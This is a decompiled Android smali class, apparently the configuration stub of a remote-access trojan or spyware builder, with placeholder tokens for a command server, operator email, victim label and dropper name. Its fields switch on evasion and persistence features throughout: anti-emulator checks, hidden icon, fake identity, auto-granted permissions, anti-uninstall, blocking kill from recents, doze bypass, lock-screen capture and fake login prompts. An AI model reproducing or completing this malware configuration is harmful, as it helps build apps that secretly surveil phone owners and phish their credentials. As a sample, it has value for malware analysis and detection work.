.class public Lcom/icontrol/protector/My_Configs;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static ALL_CONFIG:Ljava/lang/String;

.field public static Access_type:Ljava/lang/String;

.field public static Anti_Delete:Ljava/lang/String;

.field public static Anti_emulator:Ljava/lang/String;

.field public static Capture_Lock:Ljava/lang/String;

.field public static Click_Prim:Ljava/lang/String;

.field public static Drop_name:Ljava/lang/String;

.field public static HA:Ljava/lang/String;

.field public static HOME_NAME:Ljava/lang/String;

.field public static Hide_Type:Ljava/lang/String;

.field public static Hide_ico:Ljava/lang/String;

.field public static Is_Store:Ljava/lang/String;

.field public static MA:Ljava/lang/String;

.field public static Mob_Name:Ljava/lang/String;

.field public static Prevent_sleep:Ljava/lang/String;

.field public static Stiky_Recent:Ljava/lang/String;

.field public static Tracking_Data_str:Ljava/lang/String;

.field public static USR_HOST:Ljava/lang/String;

.field public static USR_MAIL:Ljava/lang/String;

.field public static _Login_btn_:Ljava/lang/String;

.field public static _Login_dis_:Ljava/lang/String;

.field public static _Login_lng_:Ljava/lang/String;

.field public static _Login_title_:Ljava/lang/String;

.field public static _Notfy_MSG_:Ljava/lang/String;

.field public static _Notfy_TITL_:Ljava/lang/String;

.field public static subdir:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_ha()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->HA:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_ma()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->MA:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_sbdir()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->subdir:Ljava/lang/String;

    const-string v0, "[OBFS]com.appd.instll"

    const-string v1, "[OBFS]"

    invoke-static {v0, v1}, Lcom/icontrol/protector/n;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Drop_name:Ljava/lang/String;

    const-string v0, "[OBFS][Client_N]"

    invoke-static {v0, v1}, Lcom/icontrol/protector/n;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Mob_Name:Ljava/lang/String;

    const-string v0, "[OBFS][_NOTIFI_TITLE_]"

    invoke-static {v0, v1}, Lcom/icontrol/protector/n;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Notfy_TITL_:Ljava/lang/String;

    const-string v0, "[OBFS][_NOTIFI_MSG_]"

    invoke-static {v0, v1}, Lcom/icontrol/protector/n;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Notfy_MSG_:Ljava/lang/String;

    const-string v0, "[NAME>LNK>ID!]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    const-string v0, "[log-title]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_title_:Ljava/lang/String;

    const-string v0, "[log-dis]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_dis_:Ljava/lang/String;

    const-string v0, "[log-btn]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    const-string v0, "[log-lng]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_lng_:Ljava/lang/String;

    const-string v0, "[SERVER_ADRESS]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->USR_HOST:Ljava/lang/String;

    const-string v0, "[USER_MAIL]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->USR_MAIL:Ljava/lang/String;

    const-string v0, "[BSE_URL]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->HOME_NAME:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_click()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Click_Prim:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_kill()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Stiky_Recent:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_undelete()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Anti_Delete:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_allconfig()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->ALL_CONFIG:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_emu()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Anti_emulator:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_hideit()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Hide_ico:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_hideentype()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_accsstype()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Access_type:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_dozestate()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Prevent_sleep:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_storemod()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Is_Store:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_caplock()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Capture_Lock:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static get_accsstype()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-GUID]"

    return-object v0
.end method

.method private static get_allconfig()Ljava/lang/String;
    .locals 1

    const-string v0, "[ALL-CONFG]"

    return-object v0
.end method

.method private static get_caplock()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-CAPLOCK]"

    return-object v0
.end method

.method private static get_click()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-AUTOGRANT]"

    return-object v0
.end method

.method private static get_dozestate()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-DOZE]"

    return-object v0
.end method

.method private static get_emu()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-NOEMU]"

    return-object v0
.end method

.method private static get_ha()Ljava/lang/String;
    .locals 1

    const-string v0, "com.icontrol.protector.HiddenActivity"

    return-object v0
.end method

.method private static get_hideentype()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-FAKE]"

    return-object v0
.end method

.method private static get_hideit()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-HIDDEEN]"

    return-object v0
.end method

.method private static get_kill()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-NOKILL]"

    return-object v0
.end method

.method private static get_ma()Ljava/lang/String;
    .locals 1

    const-string v0, "com.icontrol.protector.Splasher"

    return-object v0
.end method

.method private static get_sbdir()Ljava/lang/String;
    .locals 1

    const-string v0, "[CRNT-SUB]"

    return-object v0
.end method

.method private static get_storemod()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-STORE]"

    return-object v0
.end method

.method private static get_undelete()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-DELTE]"

    return-object v0
.end method
